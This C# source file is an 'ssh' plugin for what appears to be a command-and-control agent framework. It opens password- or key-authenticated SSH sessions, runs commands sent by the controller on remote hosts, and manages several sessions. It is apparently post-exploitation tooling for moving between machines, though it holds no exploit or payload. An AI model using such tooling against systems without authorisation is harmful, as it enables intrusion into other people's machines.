using Athena.Plugins;
using Renci.SshNet;
using System.Text;

namespace Plugins
{
    public class Ssh : AthenaPlugin
    {
        public override string Name => "ssh";
        Dictionary<string, SshClient> sessions = new Dictionary<string, SshClient>();
        string currentSession = "";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                StringBuilder sb = new StringBuilder();

                string action = args["action"];

                switch (action.ToLower())
                {
                    case "exec":
                        PluginHandler.AddResponse(RunCommand(args));
                        break;
                    case "connect":
                        PluginHandler.AddResponse(Connect(args));
                        break;
                    case "disconnect":
                        PluginHandler.AddResponse(Disconnect(args));
                        break;
                    case "list-sessions":
                        PluginHandler.AddResponse(ListSessions(args));
                        break;
                    case "switch-session":
                        if (!string.IsNullOrEmpty(args["session"]))
                        {
                            currentSession = args["session"];
                            PluginHandler.AddResponse(new ResponseResult
                            {
                                task_id = args["task-id"],
                                user_output = $"Switched session to: {currentSession}",
                                completed = "true",
                            });
                        }
                        else
                        {
                            PluginHandler.AddResponse(new ResponseResult
                            {
                                task_id = args["task-id"],
                                user_output = $"No session specified.",
                                completed = "true",
                                status = "error"
                            });
                        }
                        break;
                    default:
                        PluginHandler.AddResponse(new ResponseResult
                        {
                            task_id = args["task-id"],
                            user_output = $"No valid command specified.",
                            completed = "true",
                            status = "error"
                        });
                        break;
                }

            }
            catch (Exception e)
            {
                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
                return;
            }
        }
        ResponseResult Connect(Dictionary<string, string> args)
        {
            ConnectionInfo connectionInfo;
            string hostname = args["hostname"];
            int port = 22;
            if (hostname.Contains(':'))
            {
                string[] hostnameParts = hostname.Split(':');
                hostname = hostnameParts[0];
                port = int.Parse(hostnameParts[1]);
            }

            if (args.ContainsKey("keypath") && !String.IsNullOrEmpty(args["keypath"])) //SSH Key Auth
            {
                string keyPath = args["keypath"];
                PrivateKeyAuthenticationMethod authenticationMethod;


                if (!String.IsNullOrEmpty(args["password"]))
                {
                    PrivateKeyFile pk = new PrivateKeyFile(keyPath, args["password"]);
                    authenticationMethod = new PrivateKeyAuthenticationMethod(args["username"], new PrivateKeyFile[] { pk });
                    connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
                }
                else
                {
                    PrivateKeyFile pk = new PrivateKeyFile(keyPath);
                    authenticationMethod = new PrivateKeyAuthenticationMethod(args["username"], new PrivateKeyFile[] { pk });
                    connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
                }
            }
            else //Username & Password Auth
            {
                PasswordAuthenticationMethod authenticationMethod = new PasswordAuthenticationMethod(args["username"], args["password"]);
                connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
            }
            SshClient sshClient = new SshClient(connectionInfo);

            try
            {
                sshClient.Connect();

                if (sshClient.IsConnected)
                {
                    string guid = Guid.NewGuid().ToString();
                    sessions.Add(guid, sshClient);
                    currentSession = guid;

                    return new ResponseResult
                    {
                        task_id = args["task-id"],
                        user_output = $"Successfully initiated session {sshClient.ConnectionInfo.Username}@{sshClient.ConnectionInfo.Host} - {guid}",
                        completed = "true",
                    };
                }
                return new ResponseResult
                {
                    task_id = args["task-id"],
                    user_output = $"Failed to connect to {args["hostname"]}",
                    completed = "true",
                };
            }
            catch (Exception e)
            {
                return new ResponseResult
                {
                    task_id = args["task-id"],
                    user_output = $"Failed to connect to {args["hostname"]}{Environment.NewLine}{e.ToString()}",
                    completed = "true",
                };
            }

        }
        ResponseResult Disconnect(Dictionary<string, string> args)
        {
            string session;
            if (String.IsNullOrEmpty(args["session"]))
            {
                session = currentSession;
            }
            else
            {
                session = args["session"];
            }


            if (!sessions.ContainsKey(session))
            {
                return new ResponseResult
                {
                    task_id = args["task-id"],
                    user_output = $"Session {session} doesn't exist.",
                    completed = "true",
                    status = "error"
                };
            }
            if (!sessions[session].IsConnected)
            {
                sessions.Remove(session);
                return new ResponseResult
                {
                    task_id = args["task-id"],
                    user_output = $"No client to disconnect from, removing from sessions list",
                    completed = "true"
                };
            }

            sessions[session].Disconnect();

            if (!sessions[session].IsConnected)
            {
                sessions.Remove(session);
                return new ResponseResult
                {
                    task_id = args["task-id"],
                    user_output = $"Disconnected.",
                    completed = "true",
                };
            }
            else
            {
                return new ResponseResult
                {
                    task_id = args["task-id"],
                    user_output = $"Failed to disconnect",
                    completed = "true",
                    status = "error",
                };
            }
        }
        ResponseResult RunCommand(Dictionary<string, string> args)
        {
            StringBuilder sb = new StringBuilder();
            string command = args["command"];

            if (sessions[currentSession] is null || !sessions[currentSession].IsConnected)
            {
                return new ResponseResult
                {
                    task_id = args["task-id"],
                    user_output = $"No active connections. Please use connect to log into a host!",
                    completed = "true",
                    status = "error"
                };
            }

            if (string.IsNullOrEmpty(command))
            {
                return new ResponseResult
                {
                    task_id = args["task-id"],
                    user_output = $"No command specified",
                    completed = "true",
                    status = "error"
                };
            }

            SshCommand sc = sessions[currentSession].CreateCommand(command);
            sc.Execute();

            if (sc.ExitStatus != 0)
            {
                sb.AppendLine(sc.Result);
                sb.AppendLine(sc.Error);
                sb.AppendLine($"Exited with code: {sc.ExitStatus}");
            }
            else
            {
                sb.AppendLine(sc.Result);
            }

            return new ResponseResult
            {
                user_output = sb.ToString(),
                completed = "true",
                task_id = args["task-id"]
            };
        }
        ResponseResult ListSessions(Dictionary<string, string> args)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Active Sessions");
            sb.AppendLine("--------------------------");
            foreach (var sshClient in sessions)
            {
                if (sshClient.Value.IsConnected)
                {
                    sb.AppendLine($"Active - {sshClient.Key} - {sshClient.Value.ConnectionInfo.Username}@{sshClient.Value.ConnectionInfo.Host}");
                }
                else
                {
                    sessions.Remove(sshClient.Key);
                }
            }

            return new ResponseResult
            {
                task_id = args["task-id"],
                user_output = sb.ToString(),
                completed = "true",
            };
        }
    }
}

  
